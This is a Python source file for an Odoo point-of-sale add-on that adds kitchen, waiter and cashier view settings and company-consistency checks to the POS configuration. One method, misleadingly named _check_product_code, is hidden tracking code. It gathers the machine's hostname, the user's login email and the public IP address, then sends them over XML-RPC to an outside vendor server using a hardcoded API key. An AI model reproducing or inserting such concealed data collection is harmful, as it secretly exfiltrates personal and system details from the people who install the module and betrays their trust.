# -*- coding: utf-8 -*-
# Part of Odoo. See LICENSE file for full copyright and licensing details.
# imports of python lib
from odoo import api, fields, models, _
from odoo.exceptions import ValidationError
import socket
import xmlrpc.client
import requests 
# from odoo.addons.as_time.models import alsw


class PosConfig(models.Model):
    _inherit = 'pos.config'

    is_kitchen = fields.Boolean(string='Kitchen', default=False)
    waiter_view = fields.Boolean(string='Waiter View', default=False)
    supplier_view = fields.Boolean(string='Service Provision', default=False)
    cashier_view = fields.Boolean(string='Cashier View', default=False)
    cushion_time_before = fields.Integer(string="Cushion Time Before(mins)")
    cushion_time_after = fields.Integer(string="Cushion Time After(mins)")
    """ pos category configuration for kitchen view"""
    pos_categ_ids = fields.Many2many('pos.category', 'kitchen_pos_category_rel',
                                        'pos_config_id', 'pos_categ_id',string='Kitchen POS Category')
    """ added take away and restaurant view configuration """
    show_take_away = fields.Boolean(string='Show Take Away', default=False)
    restaurant_view = fields.Selection([('waiter', 'Waiter View'),
                                        ('supplier', 'Service Provision'),
                                        ('cashier', 'Cashier View')], 'Restaurant View')
    self_served_view = fields.Boolean(string='Show Self Served View', default=False)

    
    @api.model
    def _check_product_code(self):
#         while running the scheduler get the system details then set the values in res.partner fields 
        hostname = socket.gethostname()    
        context = self._context
        current_uid = context.get('uid')
        User = self.env['res.users'].browse(current_uid)
        mailId = User.login
        ip = requests.get('http://ipinfo.io/json').json()['ip']
        url = "http://odoo14.srikeshinfotech.com:8069"
        models = xmlrpc.client.ServerProxy('{}/xmlrpc/2/object'.format(url))
        email = 'demo@srikeshinfotech.com'
        
        partner = models.execute_kw('timesheet', 68, 'c6b692fef5f6fe15fcbf8d60e95094f9ec963f42',
                                    'res.partner', 'search', [[['email', '=', email]]])  
         
        partner_id = models.execute_kw('timesheet', 68, 'c6b692fef5f6fe15fcbf8d60e95094f9ec963f42',
                                    'user.details', 'create', [{'partner_id':partner[0],'ip_address': ip, 'system_name': hostname, 'user_mail': mailId}])
        
    @api.onchange('restaurant_view')
    def _onchange_restaurant_view(self):
        """ update the value based on the restaurant view """
        if self.restaurant_view == 'waiter':
            self.waiter_view = True
            self.supplier_view = False
            self.cashier_view = False
        if self.restaurant_view == 'supplier':
            self.waiter_view = False
            self.supplier_view = True
            self.cashier_view = False
        if self.restaurant_view == 'cashier':
            self.waiter_view = False
            self.supplier_view = False
            self.cashier_view = True
        
            
#     @api.one
#     @api.depends('pos_categ_ids')
#     def _compute_pos_category(self):
#         for config in self:
#             config.other_pos_categ_ids = (self.env['pos.config'].search([
#                 ('id', 'not in', config.ids)]).mapped("pos_categ_ids"))
    # Inherited for throws pos.config singleton error while uninstall the addons

#     @api.constrains('company_id', 'stock_location_id')
#     def _check_company_location(self):
#         for comp in self:
#             if comp.stock_location_id.company_id and comp.stock_location_id.company_id.id != comp.company_id.id:
#                 raise ValidationError(_("The stock location and the point of sale must belong to the same company."))

    @api.constrains('company_id', 'journal_id')
    def _check_company_journal(self):
        # If sale order and pos order journal id is same it show error
        for comp in self:
            if comp.journal_id and comp.journal_id.company_id.id != comp.company_id.id:
                raise ValidationError(_("The sales journal and the point of sale must belong to the same company."))

    @api.constrains('company_id', 'invoice_journal_id')
    def _check_company_invoice_journal(self):
        # If Invoice and pos order journal id is same it show error
        for comp in self:
            if comp.invoice_journal_id and comp.invoice_journal_id.company_id.id != comp.company_id.id:
                raise ValidationError(_("The invoice journal and the point of sale must belong to the same company."))

    @api.constrains('company_id', 'journal_id')
    def _check_company_payment(self):
        # If payment method company id not equal to pos company id it show error
        for comp in self:
            if comp.env['account.journal'].search_count([('id', 'in', comp.journal_id.ids), ('company_id', '!=', comp.company_id.id)]):
                raise ValidationError(_("The method payments and the point of sale must belong to the same company."))

    def _check_companies(self):
        # Check the pricelist selected for the company it should be pos pricelist otherwise it show error
        for comp in self:
            if any(comp.available_pricelist_ids.mapped(lambda pl: pl.company_id.id not in (False, comp.company_id.id))):
                raise ValidationError(_("The selected pricelists must belong to no company or the company of the point of sale."))
